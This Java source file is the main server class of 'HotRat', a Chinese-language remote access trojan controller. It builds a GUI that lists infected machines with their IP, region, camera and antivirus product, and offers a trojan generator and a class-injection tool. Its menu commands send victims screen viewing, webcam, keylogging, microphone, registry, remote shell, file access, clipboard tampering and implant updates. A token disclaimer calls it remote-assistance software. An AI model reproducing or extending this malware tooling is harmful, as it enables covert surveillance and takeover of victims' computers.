package me.server;

import me.server.createtrojan.CreateTrojan;
import me.server.createtrojan.InjectWindow;
import me.server.loadconfig.ConfigReader;
import me.server.loadconfig.ConfigWriter;
import me.server.loadconfig.SystemSettings;
import me.server.receive.*;
import me.server.utils.*;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.MouseListener;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class Server {
    public static ConcurrentHashMap<String,Socket> map = new ConcurrentHashMap<>();
    public static DefaultTableModel defaultListModel;
    public static DefaultTableModel defaultTableModel;
    static ServerSocket socket;
    static Socket mesocket;
    public static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
    public static String port;
    public static String lookandfeel;
    public static String head;
    public static String password;
    public static final String VERSION = "8.6";
    public static ConfigWriter configWriter = new ConfigWriter();
    static InputStream inputStream12 = Server.class.getClassLoader().getResourceAsStream("me/resources/maintable.png");
    static Image image12;
    static ConfigReader configReader = new ConfigReader();

    static {
        try {
            image12 = ImageIO.read(inputStream12);
        } catch (IOException e) {
        }
    }
    public static void main(String[] args) {
        try {
            File file = new File(CFGPATH);
            JFrame frame = new JFrame("HotRat "+ VERSION);
            if(!file.exists()) {
                configWriter.write(CFGPATH,"port","8000");
                configWriter.write(CFGPATH,"head","Nachoneko");
                configWriter.write(CFGPATH,"lookandfeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
            }
            port = configReader.read(CFGPATH,"port");
            lookandfeel = configReader.read(CFGPATH,"lookandfeel");
            head = configReader.read(CFGPATH,"head");
            password = configReader.read(CFGPATH,"password");
            UIManager.setLookAndFeel(lookandfeel);
            defaultTableModel = new DefaultTableModel(null,new String[]{"时间","事件"});
            Date date = new Date();
            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
            JTable chatTable = new JTable(){
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };
            chatTable.setModel(defaultTableModel);
            chatTable.setShowVerticalLines(false);
            chatTable.setShowHorizontalLines(false);
            chatTable.getTableHeader().setReorderingAllowed(false);
            chatTable.getTableHeader().setResizingAllowed(false);
            chatTable.getColumnModel().getColumn(0).setPreferredWidth(180);
            chatTable.getColumnModel().getColumn(1).setPreferredWidth(600);
            InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/icon.png");
            Image image = ImageIO.read(inputStream);
            InputStream inputStream1 = Server.class.getClassLoader().getResourceAsStream("me/resources/1.png");
            Image image1 = ImageIO.read(inputStream1);
            InputStream inputStream2 = Server.class.getClassLoader().getResourceAsStream("me/resources/2.png");
            Image image2 = ImageIO.read(inputStream2);
            InputStream inputStream3 = Server.class.getClassLoader().getResourceAsStream("me/resources/3.png");
            Image image3 = ImageIO.read(inputStream3);
            InputStream inputStream4 = Server.class.getClassLoader().getResourceAsStream("me/resources/4.png");
            Image image4 = ImageIO.read(inputStream4);
            InputStream inputStream5 = Server.class.getClassLoader().getResourceAsStream("me/resources/5.png");
            Image image5 = ImageIO.read(inputStream5);
            InputStream inputStream6 = Server.class.getClassLoader().getResourceAsStream("me/resources/6.png");
            Image image6 = ImageIO.read(inputStream6);
            InputStream inputStream7 = Server.class.getClassLoader().getResourceAsStream("me/resources/7.png");
            Image image7 = ImageIO.read(inputStream7);
            InputStream inputStream8 = Server.class.getClassLoader().getResourceAsStream("me/resources/8.png");
            Image image8 = ImageIO.read(inputStream8);
            InputStream inputStream10 = Server.class.getClassLoader().getResourceAsStream("me/resources/10.png");
            Image image10 = ImageIO.read(inputStream10);
            InputStream inputStream9 = Server.class.getClassLoader().getResourceAsStream("me/resources/9.png");
            Image image9 = ImageIO.read(inputStream9);
            InputStream inputStream11 = Server.class.getClassLoader().getResourceAsStream("me/resources/11.png");
            Image image11 = ImageIO.read(inputStream11);
            JScrollPane jScrollPane = new JScrollPane(chatTable);
            jScrollPane.setPreferredSize(new Dimension(0,100));
            frame.setIconImage(image);
            JPopupMenu popupMenu = new JPopupMenu();
            popupMenu.addSeparator();
            JMenuItem popupItem = new JMenuItem("屏幕控制");
            JMenuItem popupItem1 = new JMenuItem("系统管理");
            JMenuItem popupItem2 = new JMenuItem("视频监控");
            JMenuItem popupItem3 = new JMenuItem("注册表");
            JMenuItem popupItem4 = new JMenuItem("键盘监听");
            JMenuItem popupItem5 = new JMenuItem("远程聊天");
            JMenuItem popupItem6 = new JMenuItem("更多功能");
            JMenuItem popupItem7 = new JMenuItem("解除主机");
            JMenuItem popupItem8 = new JMenuItem("语言监听");
            JMenuItem popupItem9 = new JMenuItem("文件管理");
            JMenuItem popupItem10 = new JMenuItem("远程命令");
            popupItem.setIcon(new ImageIcon(image1));
            popupItem9.setIcon(new ImageIcon(image10));
            popupItem2.setIcon(new ImageIcon(image8));
            popupItem3.setIcon(new ImageIcon(image7));
            popupItem4.setIcon(new ImageIcon(image5));
            popupItem5.setIcon(new ImageIcon(image4));
            popupItem6.setIcon(new ImageIcon(image3));
            popupItem7.setIcon(new ImageIcon(image2));
            popupItem8.setIcon(new ImageIcon(image11));
            popupItem9.setIcon(new ImageIcon(image10));
            popupItem1.setIcon(new ImageIcon(image9));
            popupItem10.setIcon(new ImageIcon(image6));
            popupMenu.add(popupItem);
            popupMenu.add(popupItem9);
            popupMenu.add(popupItem1);
            popupMenu.add(popupItem2);
            popupMenu.add(popupItem8);
            popupMenu.add(popupItem10);
            popupMenu.add(popupItem3);
            popupMenu.add(popupItem4);
            popupMenu.add(popupItem5);
            popupMenu.add(popupItem6);
            popupMenu.add(popupItem7);
            MouseListener mouseListener = new MyMouseAdapter(popupMenu);
            JMenuBar bar = new JMenuBar();
            JMenu menu = new JMenu("设置");
            JMenu menu1 = new JMenu("主题");
            JMenuItem jMenuItem = new JMenuItem("软件信息");
            JMenuItem jMenuItem2 = new JMenuItem("系统设置");
            JMenuItem jMenuItem1 = new JMenuItem("退出");
            JMenuItem jMenuItem3 = new JMenuItem("Swing");
            JMenuItem jMenuItem4 = new JMenuItem("Windows");
            JMenuItem jMenuItem5 = new JMenuItem("Motif");
            JMenuItem jMenuItem6 = new JMenuItem("Nimbus");
            JMenuItem jMenuItem7 = new JMenuItem("生成小马");
            JMenuItem jMenuItem8 = new JMenuItem("列表颜色");
            JMenuItem jMenuItem9 = new JMenuItem("Smart");
            JMenuItem jMenuItem10 = new JMenuItem("Luna");
            JMenuItem jMenuItem11 = new JMenuItem("HiFi");
            JMenuItem jMenuItem12 = new JMenuItem("Class Inject");
            frame.add(jScrollPane,BorderLayout.SOUTH);
            defaultTableModel.addRow(new String[]{format.format(date),"欢迎使用HotRat远程协助"});
            defaultTableModel.addRow(new String[]{format.format(date),"本软件仅供于远程协助和远程维护 请勿用于非法用途"});
            defaultTableModel.addRow(new String[]{format.format(date),"项目开源地址:https://github.com/Kr9jd/HotRAT"});
            defaultTableModel.addRow(new String[]{format.format(date),"作者联系QQ:511413324"});
            defaultTableModel.addRow(new String[]{format.format(date),"当前监听端口:" + port});
            JPanel panel = new JPanel();
            menu.add(jMenuItem);
            menu.add(jMenuItem2);
            menu.add(jMenuItem7);
            menu.add(jMenuItem8);
            menu.add(jMenuItem12);
            menu.add(jMenuItem1);
            menu1.add(jMenuItem3);
            menu1.add(jMenuItem4);
            menu1.add(jMenuItem5);
            menu1.add(jMenuItem6);
            menu1.add(jMenuItem9);
            menu1.add(jMenuItem10);
            menu1.add(jMenuItem11);
            bar.add(menu);
            bar.add(menu1);
            frame.setResizable(false);
            JScrollPane scrollPane = new JScrollPane();
            defaultListModel = new DefaultTableModel(null,new String[]{"","用户名称","计算机名称","操作系统","IP地址","地区","小马名称","进程ID","摄像头","小马版本","杀毒软件"});
            JTable table = new JTable(defaultListModel){
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };
            table.addMouseListener(mouseListener);
            table.setFillsViewportHeight(true);
            table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
            table.getColumnModel().getColumn(0).setPreferredWidth(25);
            table.getColumnModel().getColumn(1).setPreferredWidth(150);
            table.getColumnModel().getColumn(2).setPreferredWidth(150);
            table.getColumnModel().getColumn(3).setPreferredWidth(100);
            table.getColumnModel().getColumn(4).setPreferredWidth(150);
            table.getColumnModel().getColumn(5).setPreferredWidth(120);
            table.getColumnModel().getColumn(6).setPreferredWidth(100);
            table.getColumnModel().getColumn(7).setPreferredWidth(100);
            table.getColumnModel().getColumn(8).setPreferredWidth(150);
            table.getColumnModel().getColumn(9).setPreferredWidth(90);
            table.getColumnModel().getColumn(10).setPreferredWidth(190);
            table.getColumnModel().getColumn(0).setCellRenderer(new ImageRendererUtils());
            table.setShowHorizontalLines(false);
            table.setShowVerticalLines(false);
            table.getTableHeader().setReorderingAllowed(false);
            table.getTableHeader().setResizingAllowed(false);
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            table.setRowHeight(20);
            scrollPane.setViewportView(table);
            frame.add(panel,BorderLayout.NORTH);
            frame.add(scrollPane);
            frame.setJMenuBar(bar);
            frame.setVisible(true);
            frame.setSize(1100,700);
            frame.setLocationRelativeTo(null);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            MessageWindow.myDialog(HttpUtils.get(new URL("https://gitee.com/zhao-yk/nmsl/raw/master/HotRAT")));
            ExecutorService executorService = Executors.newCachedThreadPool();
            jMenuItem.addActionListener(a->{
                JOptionPane.showMessageDialog(null,"By RedRat Security Team \n 版本:" + VERSION,"版本信息",JOptionPane.INFORMATION_MESSAGE);
            });
            jMenuItem1.addActionListener(a->{
                System.exit(0);
            });
            jMenuItem2.addActionListener(a ->{
                file.delete();
                new SystemSettings();
            });
            jMenuItem3.addActionListener(a->{
                try {
                    file.delete();
                    configWriter.write(CFGPATH,"port",port);
                    configWriter.write(CFGPATH,"lookandfeel","javax.swing.plaf.metal.MetalLookAndFeel");
                    configWriter.write(CFGPATH,"head",head);
                    configWriter.write(CFGPATH,"password",password);
                    JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem4.addActionListener(a->{
                try {
                    file.delete();
                    configWriter.write(CFGPATH,"port",port);
                    configWriter.write(CFGPATH,"lookandfeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
                    configWriter.write(CFGPATH,"head",head);
                    configWriter.write(CFGPATH,"password",password);
                    JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem12.addActionListener(a->{
                new InjectWindow();
            });
            jMenuItem5.addActionListener(a->{
                try {
                    file.delete();
                    configWriter.write(CFGPATH,"port",port);
                    configWriter.write(CFGPATH,"lookandfeel","com.sun.java.swing.plaf.motif.MotifLookAndFeel");
                    configWriter.write(CFGPATH,"head",head);
                    configWriter.write(CFGPATH,"password",password);
                    JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem6.addActionListener(a->{
                file.delete();
                configWriter.write(CFGPATH,"port",port);
                configWriter.write(CFGPATH,"lookandfeel","javax.swing.plaf.nimbus.NimbusLookAndFeel");
                configWriter.write(CFGPATH,"head",head);
                configWriter.write(CFGPATH,"password",password);
                JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem9.addActionListener(a->{
                file.delete();
                configWriter.write(CFGPATH,"port",port);
                configWriter.write(CFGPATH,"lookandfeel","com.jtattoo.plaf.smart.SmartLookAndFeel");
                configWriter.write(CFGPATH,"head",head);
                configWriter.write(CFGPATH,"password",password);
                JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem10.addActionListener(a->{
                file.delete();
                configWriter.write(CFGPATH,"port",port);
                configWriter.write(CFGPATH,"lookandfeel","com.jtattoo.plaf.luna.LunaLookAndFeel");
                configWriter.write(CFGPATH,"head",head);
                configWriter.write(CFGPATH,"password",password);
                JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem11.addActionListener(a->{
                file.delete();
                configWriter.write(CFGPATH,"port",port);
                configWriter.write(CFGPATH,"lookandfeel","com.jtattoo.plaf.hifi.HiFiLookAndFeel");
                configWriter.write(CFGPATH,"head",head);
                configWriter.write(CFGPATH,"password",password);
                JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem7.addActionListener(a->{
                new CreateTrojan(frame);
            });
            jMenuItem8.addActionListener(a->{
                String[] modes = {"黑色","红色","蓝色"};
                String mode = (String) JOptionPane.showInputDialog(null,"列表颜色","颜色",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                switch (mode) {
                    case "黑色":
                        table.setForeground(new Color(0,0,0));
                        table.repaint();
                        frame.repaint();
                        break;
                    case "红色":
                        table.setForeground(new Color(255,0,0));
                        table.repaint();
                        frame.repaint();
                        break;
                    case "蓝色":
                        table.setForeground(new Color(0,0,255));
                        table.repaint();
                        frame.repaint();
                        break;
                }
            });
            popupItem.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.sendHead(MessageFlags.SHOW_SCREEN,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem9.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.sendHead(MessageFlags.SHOW_FILEWINDOW,map.get(str));
                        SendMessage.sendHead(MessageFlags.DISK_QUERT,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem1.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                            SendMessage.sendHead(MessageFlags.SHOW_TASKLIST,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem2.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                    SendMessage.sendHead(MessageFlags.SHOW_CAMERA,map.get(str));
                }).start();
                }catch (Exception e) {
                }
            });
            popupItem3.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.sendHead(MessageFlags.REGIDTER_WINDOWS_SHOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem10.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.sendHead(MessageFlags.SHOW_REMOTE_CMD,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem4.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                    SendMessage.sendHead(MessageFlags.SHOW_KEYBORADWINDOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem5.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.sendHead(MessageFlags.SHOW_REMOTECHAT,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem8.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        SendMessage.sendHead(MessageFlags.AUDIO_WINDOWS_SHOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem6.addActionListener(a->{
                try {
                    new Thread(() -> {
                        String[] modes = {"远程弹窗","远程获取QQ号","蜂鸣器","内网映射","剪切板修改","图片展示","关闭图片展示","闪屏","网页打开","转移主机","更新小马"};
                        String mode = (String) JOptionPane.showInputDialog(null,"更多功能","更多",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                        int temp = table.getSelectedRow();
                        String strings = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                        switch (mode) {
                            case "蜂鸣器":
                                    SendMessage.sendHead(MessageFlags.BUZZER,map.get(strings));
                                break;
                            case "远程弹窗":
                                    new MessageBox(map.get(strings));
                                break;
                            case "远程获取QQ号":
                                SendMessage.sendHead(MessageFlags.SHOW_QQNUMBERWINDOW,map.get(strings));
                                break;
                            case "剪切板修改":
                                SendMessage.sendHead(MessageFlags.SHOW_CLIPBORADWINDOW,map.get(strings));
                                break;
                            case "闪屏":
                                    String str =JOptionPane.showInputDialog(null,"闪屏文字..","闪屏",JOptionPane.INFORMATION_MESSAGE);
                                try {
                                    SendMessage.send(MessageFlags.FLASH_SCREEN,str.getBytes("GBK"),map.get(strings));
                                } catch (UnsupportedEncodingException e) {
                                }
                                break;
                            case "内网映射":
                                SendMessage.sendHead(MessageFlags.LAN_ACCESS_OPEN,map.get(strings));
                                break;
                            case "网页打开":
                                    String strs =JOptionPane.showInputDialog(null,"输入URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
                                try {
                                    SendMessage.send(MessageFlags.WEB_BROWSE,strs.getBytes("GBK"),map.get(strings));
                                } catch (UnsupportedEncodingException e) {
                                }
                                break;
                            case "图片展示":
                                String strs1 =JOptionPane.showInputDialog(null,"输入图片URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
                                try {
                                    SendMessage.send(MessageFlags.PICTURE_SHOW,strs1.getBytes("GBK"),map.get(strings));
                                } catch (UnsupportedEncodingException e) {
                                }
                                break;
                            case "关闭图片展示":
                                SendMessage.sendHead(MessageFlags.PICTURE_CLOSE,map.get(strings));
                                break;
                            case "转移主机":
                                LoadNewHost.Load(map.get(strings));
                                break;
                            case "更新小马":
                                    new Thread(new Runnable() {
                                        @Override
                                        public void run() {
                                            try {
                                                Update.UpLoad(map.get(strings));
                                            }catch (Exception e) {
                                            }
                                        }
                                    }).start();
                                break;
                        }
                    }).start();
                }catch (Exception e) {
                }
            });
            popupItem7.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,1) + "$" + (String)table.getValueAt(temp,2) + "$"+ (String)table.getValueAt(temp,3) + "$" + (String)table.getValueAt(temp,4)
                                + "$" + (String)table.getValueAt(temp,5)+ "$" + (String)table.getValueAt(temp,6) + "$" + (String)table.getValueAt(temp,7)+ "$" + (String)table.getValueAt(temp,8)
                                + "$" + (String)table.getValueAt(temp,9)+ "$" + (String)table.getValueAt(temp,10);
                            JOptionPane.showMessageDialog(null,"解除成功!","解除",JOptionPane.INFORMATION_MESSAGE);
                            SendMessage.sendHead(MessageFlags.RELIEVE,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            socket = new ServerSocket(Integer.parseInt(port));
            new SendHeartPack(frame,table,defaultListModel).start();
            while (true) {
                mesocket = socket.accept();
                mesocket.setSoLinger(true,0);
                executorService.execute(new ClientContext(mesocket,defaultListModel,frame,table));
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void flashTable(JTable table,DefaultTableModel defaultTableModel) throws IOException {
        for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
            defaultTableModel.removeRow(index);
        }
        Set<String> hashSet = Server.map.keySet();
        for(String context:hashSet) {
            String[] strings = context.split("\\$");
            Object[] contexts = {image12,strings[0],strings[1],strings[2],strings[3],strings[4],strings[5],strings[6],strings[7],strings[8],strings[9]};
            defaultTableModel.addRow(contexts);
        }
    }
}